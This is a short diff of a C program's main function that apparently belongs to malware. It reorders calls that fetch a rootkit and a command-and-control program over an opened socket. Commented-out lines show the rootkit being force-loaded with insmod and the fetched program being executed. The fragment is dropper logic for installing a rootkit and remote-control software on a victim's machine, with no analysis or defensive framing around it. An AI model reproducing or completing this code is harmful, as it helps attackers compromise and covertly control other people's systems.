@@ -41,13 +41,14 @@ int main()
         exit(1);
     }
     rv = opensocket();
-    rv = obtain(CCPROGRAM);
 //    memcpy(buf, "./", 2);
 //    memcpy(buf, CCPROGRAM, strlen(CCPROGRAM));
 //    char *ccargs[] = {buf, NULL};
 //    if(rv == 0) execcmd(ccargs);
     
     rv = obtain(ROOTKIT);
+    
+    rv = obtain(CCPROGRAM);
 //    char *rktargs[] = {"/sbin/insmod", "-f", ROOTKIT, NULL};
 //    if(rv == 0) execcmd(rktargs);
     
